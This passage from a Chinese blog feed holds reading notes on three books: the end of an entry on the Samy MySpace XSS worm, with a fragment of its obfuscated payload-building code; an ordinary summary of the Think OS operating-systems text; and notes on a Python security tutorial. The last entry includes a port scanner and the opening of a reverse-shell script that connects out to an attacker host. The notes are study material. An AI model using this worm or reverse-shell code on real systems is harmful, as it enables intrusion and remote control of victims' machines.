class="line">...</span><br><span class="line"><span class="keyword">if</span> (AE) &#123;</span><br><span class="line">    AE = AE.replace(<span class="string">'jav'</span> + <span class="string">'a'</span>, A + <span class="string">'jav'</span> + <span class="string">'a'</span>);</span><br><span class="line">    AE = AE.replace(<span class="string">'exp'</span> + <span class="string">'r)'</span>, <span class="string">'exp'</span> + <span class="string">'r)'</span> + A);</span><br><span class="line">    AF = <span class="string">'but most of all,samy is my hero. &lt; d'</span> + <span class="string">'iv id = '</span> + AE + <span class="string">'D'</span> + <span class="string">'IV &gt; '</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果存在了 目标的 内容，那么构造AE与AF 两段内容</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>通过这本书,或者是这篇文章,简单的了解了一个XSS蠕虫的实现，以及其传播的原理，借助WEB层面的功能，通过用户的操作伪造，实现对samy 关注，和对自己的 profile 进行修改的功能，从而实现了 这个蠕虫的大面积传播。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;突然一个状态的转变,总是需要好解的转变的时间。&lt;/p&gt;
&lt;p&gt;事前比较多，感觉自己在知识的荒野上已经漫步了好久。时而有着恐慌的感觉。&lt;/p&gt;
&lt;h2
      
    
    </summary>
    
      <category term="读本好书吧" scheme="https://blog.diglp.xyz/categories/%E8%AF%BB%E6%9C%AC%E5%A5%BD%E4%B9%A6%E5%90%A7/"/>
    
    
      <category term="读书笔记" scheme="https://blog.diglp.xyz/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息安全" scheme="https://blog.diglp.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>读本好书 《操作系统思考》</title>
    <link href="https://blog.diglp.xyz/2018/11/24/Book_ThinkOS/"/>
    <id>https://blog.diglp.xyz/2018/11/24/Book_ThinkOS/</id>
    <published>2018-11-23T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>中间有事情折腾来回飘，其中也是抽了抽时间看了看书。</p><hr><p>这里放上一幅偶遇的图，自己现在在哪里呢~</p><p><img src="http://s6.sinaimg.cn/mw690/001WHoRhzy7ogx3x03ze5&amp;690" alt="邓宁-克鲁格心理效应"></p><hr><p>身为互联网人，也难免不惊叹于互联网的发展，很久以前，一直在思考，明明有那么好的，先进的易用的科技产品，那么在平常百姓的家里怎么就这么难见到呢？一直在想，有一个怕平台，可以把这些东西推到人们身边。实则不然，哪里这么简单，更快，更方便，就是人们的选择吗？年龄，思维，甚至性格，都会去决定这些东西存在的可能。真正的拿了就走的自动售货机。。。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：操作系统思考 中文版</li><li>原文：<span class="exturl" data-url="aHR0cDovL2dyZWVudGVhcHJlc3MuY29tL3RoaW5rb3MvaHRtbC9pbmRleC5odG1s" title="http://greenteapress.com/thinkos/html/index.html">Think OS: A Brief Introduction to Operating Systems<i class="fa fa-external-link"></i></span></li><li>译者：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLw==" title="https://github.com/">飞龙<i class="fa fa-external-link"></i></span></li><li>来源：<span class="exturl" data-url="aHR0cDovL2dyZWVudGVhcHJlc3MuY29tL3dwLw==" title="http://greenteapress.com/wp/">Allen B. Downey<i class="fa fa-external-link"></i></span></li><li>协议：<span class="exturl" data-url="aHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMtc2EvNC4wLw==" title="http://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0<i class="fa fa-external-link"></i></span></li></ul><hr><p>一本入门级的讲操作系统的书，这里一样的是当作拾遗了，书写的还是很不错的，推荐！</p><p>每次都是感谢这些 开源书籍，以后有能里自己推一本！</p><p>这本书，从编译开始，到一个进程和进程的虚拟内存，文件系统，缓存，多任务，线程互斥等等的方面。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>这一部分从 解释性语言和编译性语言来引出了编译的这一个概念。</p><blockquote><p>人们通常把编程语言描述为编译语言或者解释语言。前者的意思是程序被翻译成机器语言，之后由硬件执行；而后者的意思是程序被软件解释器读取并执行。例如，C被认为是编译语言，而Python被认为是解释语言。但是二者之间的界限并不总是那么明显。</p><p>…</p><p>所以，编译执行或解释执行并不是语言的内在特征。尽管如此，在编译语言和解释语言之间有一些普遍的差异。</p></blockquote><p>很多语言都 可以被 编译 和解释两种执行方式。可以有<strong>解释性的C</strong>和<strong>编译性的Python (Py2Exe)</strong>。JAVA 更加特殊，先进行编译为 Java字节码 ，dex。</p><p>在解释性语言中，在运行的过程中，变量的名称以及变量的值都会被保存在内存空间中的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>globals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'a'</span>: <span class="number">123</span>, <span class="string">'__package__'</span>: <span class="keyword">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'a'</span>: <span class="number">123</span>, <span class="string">'__package__'</span>: <span class="keyword">None</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>而在 编译性语言的运行过程中，是不会出现变量名称的，只会变量的值（内存地址）。</p><p>编译的过程：这个可以算是考点了，预处理，编译，汇编，链接。（.i -&gt; .s -&gt; .o -&gt; .exe)。</p><p>在书中，这里细化为了 5 个步骤：预处理， 解析， 静态检查代码， 生成， 链接， 优化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -S# 译得到 汇编代码</span><br><span class="line">gcc hello.c -c# 编得到 二进制中间文件</span><br><span class="line">gcc hello.c -E# 处理</span><br></pre></td></tr></table></figure><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>书中提到的很重要的两个概念，<strong>抽象</strong> 与 <strong>虚拟化</strong> 。具体的概念就不展开了哈。OOP概念，虚拟化，可以理解为一种复杂的映射。</p><blockquote><p>“虚拟”这个词通常用于虚拟机的语境中，它是一种软件，可以创建运行特定系统的专用计算机的幻象。实际上，虚拟机可能和其它虚拟机一起运行在不同的操作系统上。</p><p>在虚拟化的语境中，我们通常把真实发生的事情叫做“物理的”，而把虚拟上发生的事情叫做“逻辑的”或者“抽象的”。</p></blockquote><p>在操作系统上讲，其对进程来讲是 <strong>抽象的</strong>，内存来讲是<strong>虚拟化的</strong>。</p><hr><p>进程隔离，进程的内存空间当然是独立的，且受保护的，两个进程的数据，如果在一起了，那么相互影响，结果是双双崩溃。（当然，通过注入技术，是可以实现对其他进程的内存访问。）</p><blockquote><p>操作系统最重要的目标之一，就是将每个进程和其它进程隔离，使程序员不必考虑每个可能的交互情况。提供这种隔离的软件对象叫做进程（Process）。</p></blockquote><p>进程，可以称之为<strong>隔离的软件对象</strong>。对象保护以下的数据对象：</p><ul><li>代码段</li><li>相关数据：静态区，堆区，栈区。</li><li>任何等待状态的IO资源</li><li>程序的硬件状态</li></ul><p>当进程出现了 Fork ：这种情况下，各个进程共享程序文本，但是拥有不同的数据和硬件状态。</p><hr><p>进程隔离的实现：</p><ul><li>多任务        可以在程序的任何时候中断它，保存寄存器状态。</li><li>虚拟内存        实际上，进程的内存在物理内存里面是分片映射的，区域不会重复-</li><li>设备抽象        可用的IO设备被抽象成对象，系统自动的实现 资源的分配及调度</li></ul><hr><blockquote><p>“TTY”代表“电传打字机”（Teletypewriter），它是原始的机械终端。</p></blockquote><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><blockquote><p>你一定听过人们谈论32位和64位系统。这些术语表明了寄存器的尺寸，也通常是虚拟地址的大小。在32位系统上，虚拟地址是32位的，也就是说虚拟地址空间为从0到0xffff ffff。这一地址空间的大小是<code>2 ** 32</code>个字节，或者4GiB。</p><p>在64位系统上，虚拟地址空间大小为<code>2 ** 64</code>个字节，或者<code>4 * 1024 ** 6</code>个字节。这是16个EiB，大约比当前的物理内存大十亿倍。虚拟内存比物理内存大很多，这看上去有些奇怪，但是我们很快就就会看到它如何工作。</p></blockquote><p>这里写到了，进程的虚拟内存结构，运行中的进程数据组织为 4 个段：</p><table><thead><tr><th>数据段</th><th>功能</th><th>位置</th></tr></thead><tbody><tr><td><code>text</code></td><td>程序文本，代码段</td><td>段靠近内存“底部”，即接近<code>0x00000000</code>的地址。</td></tr><tr><td><code>static</code></td><td>全局变量，和使用<code>static</code>声明的局部变量。</td><td>段通常刚好在<code>text</code>段上面。</td></tr><tr><td><code>stack</code></td><td>如其名是栈空间，里面是栈帧（每个Function运行时分配（参数，局部变量），重要的是RP，返回地址）</td><td>段靠近内存顶部，即接近虚拟地址空间的最大地址<code>0xffffffff</code>。在扩张过程中，它向低地址的方向增长。</td></tr><tr><td><code>heap</code></td><td>堆区，我们动态分配，以及释放的内存段 <code>malloc</code> 内存泄露的重灾区</td><td>通常在<code>static</code>段的上面。在扩张过程中，它向高地址的方向增长</td></tr></tbody></table><p>在虚拟内存地址的分布，也是有着固定的关系。</p><hr><p><strong>地址翻译</strong>        虚拟地址（Virtual Memory） 翻译成 物理地址 （Physical Memory）。这里就有了很重点的地方，就是内存映射。MMU（内存管理单元），就实现了这样的一个很重要的角色，位于CPU和主存之间。MMU在VA和PA之间执行快速的翻译。</p><blockquote><ol><li>当程序读写变量时，CPU会得到VA。</li><li>MMU将VA分成两部分，称为页码和偏移。“页”是一个内存块，页的大小取决于操作系统和硬件，通常为1~4KiB。</li><li>MMU在“页表”里查找页码，然后获取相应的物理页码。之后它将物理页码和偏移组合得到PA。</li><li>PA传递给主存，用于读写指定地址。</li></ol></blockquote><h2 id="文件与文件系统"><a href="#文件与文件系统" class="headerlink" title="文件与文件系统"></a>文件与文件系统</h2><p>HDD/SSD</p><blockquote><p>机械硬盘比较复杂。数据存储在块内，它们布局在扇区中，扇区又组成磁道。磁道在盘片上以同心圆的形式排列。</p><p>固态硬盘稍微简单一些，因为块按顺序被标号。但是这会产生另一种困难，每个块在变得不可靠之前，只能被读写有限的次数。</p></blockquote><p>在抽象的层面讲，文件系统就是<strong>文件名到文件内容的键值映射</strong>，如果你认为名称是键，内容是值，文件系统就是一种<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvS2V5LXZhbHVlX2RhdGFiYXNl" title="https://en.wikipedia.org/wiki/Key-value_database">键值对的数据库<i class="fa fa-external-link"></i></span>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">"/home/downey/file.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">fputc(<span class="string">'b'</span>, fp);<span class="comment">// 被缓冲的</span></span><br><span class="line"><span class="keyword">char</span> c = fgetc(fp);</span><br><span class="line">fclose(fp);<span class="comment">// 此时回写硬盘</span></span><br></pre></td></tr></table></figure><p>这里的文件打开后，得到了一个文件指针。</p><hr><p>从物理层面。来看待磁盘的读性操作是相当的费时的，从磁盘上的进行一个块的读 需要 <strong>2~6ms</strong> 。</p><p>所以在操作系统的层面上有以下的处理：</p><ul><li>块操作    以磁盘的块为单位加载到内存中进行处理，即使单字节数据亦然</li><li>预取    在对文件首块进行访问的时候，后面的部分已经开始了预取</li><li>缓冲    对文件进行的写操作，会在内存中线进行缓冲，之后统一的进行写入，提高写入性能</li></ul><hr><p>  数据在磁盘上如果是连续排列的，那么读写性能将会很客观，不过事实上很难做到。数据频繁的读写，很难给每一个文件都找到合适的连续空间。所以多数操作系统 <strong>把文件分散在不同的地方，使用数据结构来进行数据库的跟踪</strong>。</p><p>在 Unix 的文件系统中，数据结构被称之为<strong><code>inode</code></strong>（index node）。</p><blockquote><p>文件内容就是数据，所以关于文件内容的数据就是数据的数据，所以为“元数据”。</p></blockquote><p>inode 这个数据结构，包括文件的拥有者，权限，时间戳，等待，重要的是文件内容，这里使用间接存储，使用多级的结构，把文件分散的存储在磁盘的不同地方。第一大文件，使用多级映射，（三级）</p><p>FAT 是一种很常见的文件结构了，他的全名是 <strong>文件分配表</strong>（File Allocation Table），其思路是把磁盘的每个块都会有一个条目，这个条目的上下文叫做簇。</p><p>目录包含了每个文件的第一个簇的指针，而每个条目的指针又指向了下一个簇，所以这里形成了一个类似于链表的结构。</p><p>所以这里问题来了，在inode 的方法的文件系统中 （ext3，ext4…）好处是不会出现文件的碎片化。但是在 fat 的文件系统下，就会出现文件的碎片化 ，也就是每个簇在物理地址上的差别太大，导致多次的寻道，导致了IO性能的问题。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>这里指的是动态内存分配，<code>malloc</code>， <code>colloc</code> ，<code>free</code>， <code>realloc</code>。下面的是常见的内存错误</p><ul><li>使用未分配内存</li><li>释放后访问</li><li>释放未分配内存</li><li>重复释放内存</li><li>非法使用 realloc</li></ul><p>内存错误，通常很严重很各色诡异，所以也是最难解决的问题。 </p><ul><li>如果存在未分配的指针，运气好，地址落在了代码段，这里的内存是只读的，进行数据写之后，通常会有段错误发生，所以可以看到异常的发生。</li><li>未分配指针，如果地址落在了可读性的内存区域内，导致的问题可能更加严重，程序本身并没有明显多万，带式可能一些数据被非法的修改，导致了一些诡异的情况。而且十分的不易察觉。</li></ul><hr><p>当我们使用函数进行了内存的分配，但是我没有使用 <code>free</code> ，到后面我们又搞丢了这个分配空间的地址，那么这就导致了<strong>内存泄漏</strong>。 进程占用了过多的无用内存。如果，进程很快退出，可能不会有影响。但是时间久了，就会越来越多，到后面可能直接导致了Core 的发生。</p><p>不过，内存本身有管理机制，这种泄露使用的内存页，一般是不会再次被访问了，所以一般会被置换到硬盘的交换区。对系统性能的影响不是很大。</p><hr><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>操作系统在缓存的等级来讲，已经实现了无感知，硬件本身帮我们实现了缓存的存在</p><p><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vdGhpbmstb3MvY29udGVudC9jaDcuaHRtbA==" title="https://wizardforcel.gitbooks.io/think-os/content/ch7.html">https://wizardforcel.gitbooks.io/think-os/content/ch7.html<i class="fa fa-external-link"></i></span></p><p>内存换页：</p><blockquote><ul><li>大多数进程不会用完所分配的内存。<code>text</code>段的许多部分都永远不会执行，或者执行一次就再也不用了。这些页面可以被换出而不会引发任何问题。</li><li>如果程序泄露了内存，它可能会丢掉所分配的空间，并且永远不会使用它了。通过将这些页面换出，操作系统可以有效填补泄露。</li><li>在多数系统中，有些进程像守护进程那样，多数时间下都是闲置的，只在特定场合被“唤醒”来响应事件。当它们闲置时，这些进程可以被换出。</li><li>另外，可能有许多进程运行同一个程序。这些进程可以共享相同的<code>text</code>段，避免在物理内存中保留多个副本。</li></ul></blockquote><h2 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h2><blockquote><p>操作系统中，实现多任务的这部分叫做“内核”。在坚果或者种子中，内核是最内层的部分，由外壳所包围。在操作系统各种，内核是软件的最底层，由一些其它层包围，包括称为“Shell”的界面。计算机科学家喜欢引喻。</p></blockquote><p>在操作系统中，由于处理核心数的限制，进程之间，事实上都是串行的，他们之间由内核，进行快速的上下文切换，我没感受不到间隔，所以认为是并行的，这也就是我们的多任务。</p><p>内核在不断的处理系统的中断使用终端服务代码段。下面是相应中断的过程：</p><blockquote><ol><li>当中断发生时，硬件将程序计数器保存到一个特殊的寄存器中，并且跳到合适的中断处理器。</li><li>中断处理器将程序计数器和位寄存器，以及任何打算使用的数据寄存器的内容储存到内存中。</li><li>中断处理器运行处理中断所需的代码。</li><li>之后它复原所保存寄存器的内容。最后，复原被中断进程的程序计数器，这会跳回到被中断的进程。</li></ol></blockquote><hr><p>在发生了中断之后，系统并不会总是恢复被中断的任务，而是可能从内存中取出另一个进程的状态进行恢复，这就实现了<strong>上下文切换</strong></p><blockquote><p>在多任务的系统中，每个进程都允许运行一小段时间，叫做“时间片”或“quantum”。在上下文切换的过程中，内核会设置一些硬件计数器，它们会在时间片的末尾产生中断。当中断发生时，内核可以切换到另一个进程，或者允许被中断的进程继续执行。操作系统中做决策的这一部分叫做“<strong>调度器</strong>”。</p></blockquote><p>这里就是，进程调度了，这里就是时间片轮转法。让我想到之前 玩 手机 OC的时代：</p><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMuY29sb3Jvcy5jb20vdGhyZWFkLTEwMjYzMi0xLTEuaHRtbA==" title="https://bbs.coloros.com/thread-102632-1-1.html">CPU处理器和IO调度详解—让手机更省电更流畅<i class="fa fa-external-link"></i></span></p><hr><p>进程状态 ：由三态，五态模型。</p><blockquote><p>一台计算机上可能运行着成百上千条进程，但是通常大多数进程都是阻塞的。大多数情况下，只有一小部分进程是就绪或者运行的。当中断发生时，调度器会决定那个进程应启动或恢复</p></blockquote><hr><p>关于进程调度：</p><blockquote><ul><li>进程可能被不同的资源限制。执行大量计算的进程是计算密集的，也就是说它的运行时间取决于得到了多少CPU时间。从网络或磁盘读取数据的进程是IO密集的，也就是说如果数据输入和输出更快的话，它就会更快，但是在更多CPU时间下它不会运行得更快。最后，与用户交互的程序，在大多数时间里可能都是阻塞的，用于等待用户的动作。操作系统有时可以将进程基于它们过去的行为分类，并做出相应的调度。例如，当一个交互型进程不再被阻塞，应该马上运行，因为用户可能正在等待回应。另一方面，已经运行了很长时间的CPU密集的进程可能就不是时间敏感的。</li><li>如果一个进程可能会运行较短的时间，之后发出了阻塞的请求，它可能应该立即运行，出于两个原因：（1）如果请求需要一些时间来完成，我们应该尽快启动它，（2）长时间运行的进程应该等待短时间的进程，而不是反过来。作为类比，假设你在做苹果馅饼。面包皮需要5分钟来准备，但是之后需要半个小时的冷却。而馅料需要20分钟来准备。如果你首先准备面包皮，你可以在其冷却时准备馅料，并且可以在35分钟之内做完。如果你先准备馅料，就会花费55分钟。</li></ul></blockquote><p>这里引用文中的话，如何更明智的选择调度方式，的第一点提到了计算密集型，以及 IO密集型，这里的密集型可以理解为时间主要花费在。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>进程下面派生出了线程，和进程不同，他们共享：代码段，静态区，以及堆区。栈是独立的。</p><p>所以在使用线程的时候，最大的问题，就是线程的同步问题，<strong>如何做到线程不会同时的区争夺一个资源，或者同时区读写一个变量</strong>。死锁和竞态</p><p>进程是资源分配的最小单位，线程是调度的最小单位。</p><p>在 POSIX 的标准中，一个安全的新建线程的示例代码如下，记得编译的时候静态链接上 <code>pthread</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_t</span> make_thread(<span class="keyword">void</span> *(*entry)(<span class="keyword">void</span> *), Shared *shared)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="keyword">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">  n = pthread_create(&amp;thread, <span class="literal">NULL</span>, entry, (<span class="keyword">void</span> *)shared);</span><br><span class="line">  <span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"pthread_create failed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> thread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以，比较容易的发现，一个输出型参数，后面的就是函数的入库，再往后就是我没传入的线程函数参数。</p><hr><p>有提到，线程直接是共享代码段，静态区，以及堆区。所以，当一个线程对变量进行修改的时候，会影响到其他的线程中的值，这对于这个变量的操作是 <strong>非原子的</strong>。所以这里为了实现线程间的同步 涉及到了 <strong>互斥体（mutex）</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> counter;</span><br><span class="line">&#125; Shared;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> counter;</span><br><span class="line">  Mutex *mutex;</span><br><span class="line">&#125; Shared;</span><br></pre></td></tr></table></figure><p>对传入的参数进行修改，这里使用了mutex</p><p>一样使用 POSIX 初始化互斥体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Mutex *<span class="title">make_mutex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Mutex *mutex = check_malloc(<span class="keyword">sizeof</span>(Mutex));</span><br><span class="line">  <span class="keyword">int</span> n = pthread_mutex_init(mutex, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (n != <span class="number">0</span>) perror_exit(<span class="string">"make_lock failed"</span>); </span><br><span class="line">  <span class="keyword">return</span> mutex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在进程的函数中，先得到互斥体，如果得不到，说明有线程正则使用，那么被阻塞。直到另一个线程完成操作，解锁互斥体之后，该线程才得以运行。</p><hr><p>书中还在后面细化了这部分，可以看看代码，便跳过了。</p><h2 id="互斥体，信号量"><a href="#互斥体，信号量" class="headerlink" title="互斥体，信号量"></a>互斥体，信号量</h2><p>互斥体前面已经有提到了，先申请锁，如果得不到，说明有使用，就被阻塞，等待释放锁，得到之后立即加锁，其他的线程无法得到锁，完成之后释放，就是这样的过程，实现了线程间的同步。</p><hr><p>信号量实际上是一种高阶的互斥体，互斥体可以理解为二值信号量。信号量里面涉及到了 PV 操作。</p><p>通过互斥体来讲：mutex 为 1 说明资源存在，为0 说明正在被占用</p><p>到了信号量，sem 为 10 说明有十个资源， 为0 说明已经完全分配， -1 说明有一个进程在等待资源。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;中间有事情折腾来回飘，其中也是抽了抽时间看了看书。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;这里放上一幅偶遇的图，自己现在在哪里呢~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://s6.sinaimg.cn/mw690/001WHoRhzy7ogx3x03ze5&amp;amp;690&quot; alt
      
    
    </summary>
    
      <category term="读本好书吧" scheme="https://blog.diglp.xyz/categories/%E8%AF%BB%E6%9C%AC%E5%A5%BD%E4%B9%A6%E5%90%A7/"/>
    
    
      <category term="读书笔记" scheme="https://blog.diglp.xyz/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="https://blog.diglp.xyz/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>读本好书 《Python 安全编程教程》</title>
    <link href="https://blog.diglp.xyz/2018/10/29/Book_Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
    <id>https://blog.diglp.xyz/2018/10/29/Book_Python安全编程/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>已经地几本了，鼓励一下自己啦。这本主要是讲 <code>python</code> 用于安全相关的编程内容。本书的篇幅比较的短，这篇总结一下主要的内容。</p><hr><p>我们是愚者，我们是一只蜂 <code>1.6*10^9 &gt; 1.6*10^9</code> ，我们自己根据蓝图所画出的东西，超乎我们自己的想象。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Python 安全编程教程</li><li>原文：<span class="exturl" data-url="aHR0cDovL3d3dy5wcmltYWxzZWN1cml0eS5uZXQvdHV0b3JpYWxzL3B5dGhvbi10dXRvcmlhbHMv" title="http://www.primalsecurity.net/tutorials/python-tutorials/">Python Tutorials<i class="fa fa-external-link"></i></span></li><li>译者：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2g=" title="https://github.com/smartFlash">smartFlash<i class="fa fa-external-link"></i></span></li><li>来源：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2gvcHlTZWN1cml0eQ==" title="https://github.com/smartFlash/pySecurity">pySecurity<i class="fa fa-external-link"></i></span></li><li>协议：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2gvcHlTZWN1cml0eS9ibG9iL21hc3Rlci9MSUNFTlNF" title="https://github.com/smartFlash/pySecurity/blob/master/LICENSE">MIT License<i class="fa fa-external-link"></i></span> </li></ul><hr><p>这是一本技术类书籍，主要内容是 Python 相关的安全类的书。</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><ul><li>使用 <code>help</code> 函数，可以很方便的查看函数的相关说明</li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>简单的端口扫描功能，使用 socket 进行连接的建立，如果连接失败，代表端口未开放。这个效率当然是比较低的。一般是只是用 <code>SYN</code> 得到 <code>ACK</code> 之后就直接结束会话。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Attempting to connect to 127.0.0.1:"</span>+str(port)</span><br><span class="line">        s.connect((<span class="string">'127.0.0.1'</span>, port))</span><br><span class="line">        s.send(<span class="string">'Primal Security \n'</span>)    </span><br><span class="line">        banner = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> banner:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>书中的示例代码如上：上面对于未打开端口，捕获其异常。不做任何操作。在循环中轮询端口，建立连接，</p><h2 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h2><p>Shell 是个耳熟的，分两个类型，<code>正向Shell</code> 与 <code>反向Shell</code>。 分别为 <strong>reverse</strong> 和 <strong>bind</strong> 。正向shell 可以理解为，客户端打开了一个端口，我们组主动连接客户端。 反向shell 指的是，我们本地打开端口，让受控的客户端去连接我们。</p><hr><p>具体的代码，书中已经给出了，内容简单易读，这里加上些注释吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,sys</span><br><span class="line"></span><br><span class="line">RHOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">RPORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((RHOST, RPORT))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">     <span class="comment"># 从socket中接收XOR编码的数据 &lt; 